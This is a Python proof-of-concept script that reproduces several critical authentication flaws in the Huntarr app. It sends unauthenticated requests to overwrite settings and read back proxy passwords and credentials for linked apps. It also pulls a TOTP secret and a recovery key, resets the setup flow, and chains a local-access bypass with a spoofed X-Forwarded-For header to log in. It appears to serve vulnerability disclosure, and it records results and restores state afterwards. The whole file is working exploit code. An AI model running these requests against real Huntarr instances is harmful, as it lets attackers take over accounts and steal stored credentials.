#!/usr/bin/env python3
"""
Deterministic repro script for critical Huntarr auth/config vulnerabilities.
"""

from __future__ import annotations

import argparse
import datetime as dt
import http.cookiejar
import json
import os
import sys
import time
import urllib.error
import urllib.request
from typing import Any, Dict, List, Optional


def build_opener() -> urllib.request.OpenerDirector:
    cookie_jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))


def parse_json(body: str) -> Optional[Dict[str, Any]]:
    try:
        value = json.loads(body)
        if isinstance(value, dict):
            return value
        return {"_value": value}
    except json.JSONDecodeError:
        return None


def http_json(
    opener: urllib.request.OpenerDirector,
    method: str,
    url: str,
    payload: Optional[Dict[str, Any]] = None,
    headers: Optional[Dict[str, str]] = None,
    timeout: int = 15,
) -> Dict[str, Any]:
    req_headers: Dict[str, str] = {"Accept": "application/json"}
    if headers:
        req_headers.update(headers)

    data = None
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        req_headers["Content-Type"] = "application/json"

    req = urllib.request.Request(url=url, data=data, headers=req_headers, method=method)

    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return {
                "status": resp.getcode(),
                "body": body,
                "json": parse_json(body),
                "ok": 200 <= resp.getcode() < 300,
            }
    except urllib.error.HTTPError as err:
        body = err.read().decode("utf-8", errors="replace")
        return {
            "status": err.code,
            "body": body,
            "json": parse_json(body),
            "ok": False,
        }
    except Exception as err:  # pragma: no cover - runtime guard
        return {"status": None, "body": "", "json": None, "ok": False, "error": str(err)}


def wait_for_ready(base_url: str, timeout_sec: int) -> None:
    opener = build_opener()
    deadline = time.time() + timeout_sec
    last_err = "unknown"
    while time.time() < deadline:
        resp = http_json(opener, "GET", f"{base_url}/api/setup/status", timeout=5)
        if resp.get("status") == 200 and isinstance(resp.get("json"), dict):
            return
        last_err = f"status={resp.get('status')} body={resp.get('body', '')[:120]}"
        time.sleep(2)
    raise RuntimeError(f"Target not ready before timeout ({timeout_sec}s). Last error: {last_err}")


def ensure_owner_exists(base_url: str, username: str, password: str) -> None:
    anon = build_opener()
    status = http_json(anon, "GET", f"{base_url}/api/setup/status")
    if status.get("status") != 200:
        raise RuntimeError(f"Unable to query setup status: {status}")
    j = status.get("json") or {}
    if j.get("user_exists"):
        return

    payload = {
        "username": username,
        "password": password,
        "confirm_password": password,
        "proxy_auth_bypass": False,
    }
    create_resp = http_json(anon, "POST", f"{base_url}/setup", payload=payload)
    if create_resp.get("status") not in (200, 201):
        raise RuntimeError(f"Failed to create setup user: {create_resp}")

    # Clear lingering setup flag for clean route behavior.
    http_json(anon, "POST", f"{base_url}/api/setup/clear", payload={})


def summarize_response(resp: Dict[str, Any]) -> Dict[str, Any]:
    return {
        "status": resp.get("status"),
        "ok": resp.get("ok"),
        "json": resp.get("json"),
        "body_head": (resp.get("body") or "")[:300],
    }


def write_markdown(path: str, base_url: str, tests: List[Dict[str, Any]]) -> None:
    lines: List[str] = []
    lines.append("# Huntarr Vulnerability Repro Results")
    lines.append("")
    now_utc = dt.datetime.now(dt.timezone.utc).isoformat().replace("+00:00", "Z")
    lines.append(f"- Timestamp (UTC): `{now_utc}`")
    lines.append(f"- Target: `{base_url}`")
    lines.append("")
    lines.append("| Test | Scope | Result |")
    lines.append("|---|---|---|")
    for t in tests:
        result = "PASS" if t["passed"] else "FAIL"
        scope = "Required" if t.get("required", True) else "Optional"
        lines.append(f"| {t['id']} - {t['title']} | {scope} | **{result}** |")
    lines.append("")
    lines.append("## Details")
    lines.append("")
    for t in tests:
        result = "PASS" if t["passed"] else "FAIL"
        lines.append(f"### {t['id']} - {t['title']} ({result})")
        lines.append("")
        lines.append(f"- Expected: {t['expected']}")
        lines.append(f"- Evidence: {t['evidence']}")
        lines.append("")
        lines.append("```json")
        lines.append(json.dumps(t.get("response", {}), indent=2))
        lines.append("```")
        lines.append("")

    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://localhost:9705")
    parser.add_argument("--timeout-sec", type=int, default=240)
    parser.add_argument("--admin-user", default="repro_owner")
    parser.add_argument("--admin-pass", default="ReproPass123!")
    parser.add_argument("--json-output", default="results/proof-results.json")
    parser.add_argument("--md-output", default="results/proof-results.md")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    wait_for_ready(base_url, args.timeout_sec)
    ensure_owner_exists(base_url, args.admin_user, args.admin_pass)

    tests: List[Dict[str, Any]] = []
    anon = build_opener()

    # Test 1: Unauthenticated settings write and secret leakage in response.
    sentinel_user = "proof_proxy_user"
    sentinel_pass = "proof_proxy_password_98765"
    write_payload = {
        "proxy_enabled": True,
        "proxy_type": "http",
        "proxy_hostname": "proxy.repro.internal",
        "proxy_port": 8080,
        "proxy_username": sentinel_user,
        "proxy_password": sentinel_pass,
        "proxy_auth_bypass": False,
        "local_access_bypass": False,
    }
    t1_resp = http_json(anon, "POST", f"{base_url}/api/settings/general", payload=write_payload)
    t1_json = t1_resp.get("json") or {}
    t1_general = t1_json.get("general") if isinstance(t1_json, dict) else None
    leaked_ok = isinstance(t1_general, dict) and t1_general.get("proxy_password") == sentinel_pass
    tests.append(
        {
            "id": "T1",
            "title": "Unauthenticated settings write + returned secret field",
            "required": True,
            "expected": "Unauthenticated call should be blocked (401/403) and never return secret-like config values.",
            "passed": bool(t1_resp.get("status") == 200 and leaked_ok),
            "evidence": (
                f"status={t1_resp.get('status')}, "
                f"returned general.proxy_password={repr(t1_general.get('proxy_password') if isinstance(t1_general, dict) else None)}"
            ),
            "response": summarize_response(t1_resp),
        }
    )

    # Test 2: Unauthenticated unlink endpoint reaches business logic.
    t2_resp = http_json(anon, "POST", f"{base_url}/api/auth/plex/unlink", payload={})
    t2_err = ((t2_resp.get("json") or {}).get("error") or "").lower()
    t2_not_auth_blocked = t2_resp.get("status") not in (401, 403) and "not authenticated" not in t2_err
    tests.append(
        {
            "id": "T2",
            "title": "Unauthenticated /api/auth/plex/unlink is callable",
            "required": True,
            "expected": "Endpoint should reject unauthenticated requests with 401/403.",
            "passed": bool(t2_not_auth_blocked),
            "evidence": f"status={t2_resp.get('status')} body_error={repr((t2_resp.get('json') or {}).get('error'))}",
            "response": summarize_response(t2_resp),
        }
    )

    # Test 3: setup_mode client flag bypasses auth gate in link endpoint.
    t3_resp = http_json(
        anon,
        "POST",
        f"{base_url}/api/auth/plex/link",
        payload={"setup_mode": True, "token": "invalid_token_for_repro"},
    )
    t3_err = (t3_resp.get("json") or {}).get("error")
    t3_reached_logic = t3_err != "User not authenticated"
    tests.append(
        {
            "id": "T3",
            "title": "Client-controlled setup_mode reaches account-link flow without session",
            "required": True,
            "expected": "Unauthenticated request should fail with explicit auth error before token logic.",
            "passed": bool(t3_reached_logic),
            "evidence": f"status={t3_resp.get('status')} error={repr(t3_err)}",
            "response": summarize_response(t3_resp),
        }
    )

    # Test 4: Chained exploit - unauth settings write enables local_access_bypass,
    # then spoof X-Forwarded-For to appear local and access protected endpoints.
    t4_set_resp = http_json(
        anon,
        "POST",
        f"{base_url}/api/settings/general",
        payload={"local_access_bypass": True},
    )
    t4_access_resp = {"status": None, "json": None, "ok": False, "body": ""}
    t4_attempts = 0
    spoof_headers = {"X-Forwarded-For": "127.0.0.1"}
    # Auth settings may be cached in middleware; poll briefly for propagation.
    for _ in range(25):
        t4_attempts += 1
        t4_access_resp = http_json(
            anon, "GET", f"{base_url}/api/user/info", headers=spoof_headers,
        )
        if t4_access_resp.get("status") == 200:
            break
        time.sleep(1)
    t4_user = (t4_access_resp.get("json") or {}).get("username")
    t4_pass = t4_set_resp.get("status") == 200 and t4_access_resp.get("status") == 200 and bool(t4_user)
    tests.append(
        {
            "id": "T4",
            "title": "Chained: unauth settings write + X-Forwarded-For spoof bypasses login",
            "required": False,
            "expected": "Unauth callers must not be able to enable local_access_bypass and then spoof local IP to read user info.",
            "passed": bool(t4_pass),
            "evidence": (
                f"set_status={t4_set_resp.get('status')} "
                f"user_info_status={t4_access_resp.get('status')} username={repr(t4_user)} attempts={t4_attempts}"
            ),
            "response": {
                "set_general": summarize_response(t4_set_resp),
                "user_info_after_toggle": summarize_response(t4_access_resp),
            },
        }
    )

    # Cleanup: restore normal auth mode.
    http_json(
        anon,
        "POST",
        f"{base_url}/api/settings/general",
        payload={"local_access_bypass": False},
    )

    # Test 5: Full cross-app credential exposure in settings response.
    # The T1 response already contains this data, but we verify explicitly that
    # the response includes configuration sections for downstream *arr apps --
    # not just the "general" section that was written.
    t5_resp = http_json(
        anon,
        "POST",
        f"{base_url}/api/settings/general",
        payload={"timezone": "UTC"},
    )
    t5_json = t5_resp.get("json") or {}
    # Check for the presence of downstream app config sections in the response.
    arr_sections = [k for k in t5_json if k in (
        "sonarr", "radarr", "prowlarr", "lidarr", "readarr", "whisparr",
        "swaparr", "eros", "movie_hunt", "tv_hunt",
    )]
    tests.append(
        {
            "id": "T5",
            "title": "Full cross-app credential exposure in settings response",
            "required": True,
            "expected": "Settings write should only return the written section, not config for all integrated apps.",
            "passed": bool(t5_resp.get("status") == 200 and len(arr_sections) >= 2),
            "evidence": (
                f"status={t5_resp.get('status')}, "
                f"app_sections_in_response={arr_sections}"
            ),
            "response": {
                "status": t5_resp.get("status"),
                "ok": t5_resp.get("ok"),
                "sections_returned": list(t5_json.keys()) if isinstance(t5_json, dict) else [],
                "arr_sections_found": arr_sections,
            },
        }
    )

    # Test 6: Unauthenticated 2FA setup returns TOTP secret for owner account.
    t6_resp = http_json(anon, "POST", f"{base_url}/api/user/2fa/setup", payload={})
    t6_json = t6_resp.get("json") or {}
    t6_has_secret = bool(t6_json.get("secret") or t6_json.get("totp_secret") or t6_json.get("provisioning_uri"))
    t6_not_blocked = t6_resp.get("status") not in (401, 403)
    t6_err = (t6_json.get("error") or "").lower()
    t6_not_auth_err = "not authenticated" not in t6_err and "login required" not in t6_err
    tests.append(
        {
            "id": "T6",
            "title": "Unauthenticated 2FA setup returns TOTP secret",
            "required": True,
            "expected": "2FA setup should require authenticated session. Unauthenticated callers must get 401/403.",
            "passed": bool(t6_not_blocked and t6_not_auth_err),
            "evidence": (
                f"status={t6_resp.get('status')}, "
                f"has_secret={t6_has_secret}, "
                f"response_keys={list(t6_json.keys()) if isinstance(t6_json, dict) else 'not_dict'}"
            ),
            "response": summarize_response(t6_resp),
        }
    )

    # Test 7: Unauthenticated recovery key generation via client-controlled setup_mode.
    t7_resp = http_json(
        anon,
        "POST",
        f"{base_url}/auth/recovery-key/generate",
        payload={"setup_mode": True},
    )
    t7_json = t7_resp.get("json") or {}
    t7_has_key = bool(t7_json.get("recovery_key") or t7_json.get("key"))
    t7_not_blocked = t7_resp.get("status") not in (401, 403)
    t7_err = (t7_json.get("error") or "").lower()
    t7_not_auth_err = "not authenticated" not in t7_err and "login required" not in t7_err
    tests.append(
        {
            "id": "T7",
            "title": "Unauthenticated recovery key generation via setup_mode",
            "required": True,
            "expected": "Recovery key generation should require authenticated session and verified password.",
            "passed": bool(t7_not_blocked and t7_not_auth_err),
            "evidence": (
                f"status={t7_resp.get('status')}, "
                f"has_recovery_key={t7_has_key}, "
                f"response_keys={list(t7_json.keys()) if isinstance(t7_json, dict) else 'not_dict'}"
            ),
            "response": summarize_response(t7_resp),
        }
    )

    # Test 8: Unauthenticated setup clear re-arms the setup flow.
    # This is tested last because it can disrupt instance state.
    t8_resp = http_json(anon, "POST", f"{base_url}/api/setup/clear", payload={})
    t8_not_blocked = t8_resp.get("status") not in (401, 403)
    t8_err = ((t8_resp.get("json") or {}).get("error") or "").lower()
    t8_not_auth_err = "not authenticated" not in t8_err and "login required" not in t8_err
    # Verify setup was actually re-armed by checking if setup status now shows no user
    # or setup_complete=false.
    t8_status_resp = http_json(anon, "GET", f"{base_url}/api/setup/status")
    t8_status_json = t8_status_resp.get("json") or {}
    t8_setup_rearmed = (
        t8_status_json.get("setup_complete") is False
        or t8_status_json.get("user_exists") is False
        or t8_status_json.get("setup_required") is True
    )
    tests.append(
        {
            "id": "T8",
            "title": "Unauthenticated setup clear re-arms account creation",
            "required": True,
            "expected": "Setup clear should require authenticated owner session. Unauthenticated callers must get 401/403.",
            "passed": bool(t8_not_blocked and t8_not_auth_err),
            "evidence": (
                f"clear_status={t8_resp.get('status')}, "
                f"setup_status_after={t8_status_json}, "
                f"setup_rearmed={t8_setup_rearmed}"
            ),
            "response": {
                "clear": summarize_response(t8_resp),
                "setup_status_after": summarize_response(t8_status_resp),
            },
        }
    )

    # Restore: re-create owner account if setup was cleared.
    if t8_setup_rearmed:
        try:
            ensure_owner_exists(base_url, args.admin_user, args.admin_pass)
        except RuntimeError:
            pass  # Best-effort restore; container is ephemeral anyway.

    required_tests = [t for t in tests if t.get("required", True)]

    summary = {
        "timestamp_utc": dt.datetime.now(dt.timezone.utc).isoformat().replace("+00:00", "Z"),
        "target": base_url,
        "tests": tests,
        "all_passed": all(t["passed"] for t in tests),
        "required_passed": all(t["passed"] for t in required_tests),
    }

    os.makedirs(os.path.dirname(args.json_output), exist_ok=True)
    with open(args.json_output, "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2)

    write_markdown(args.md_output, base_url, tests)

    print(json.dumps(summary, indent=2))
    return 0 if summary["required_passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
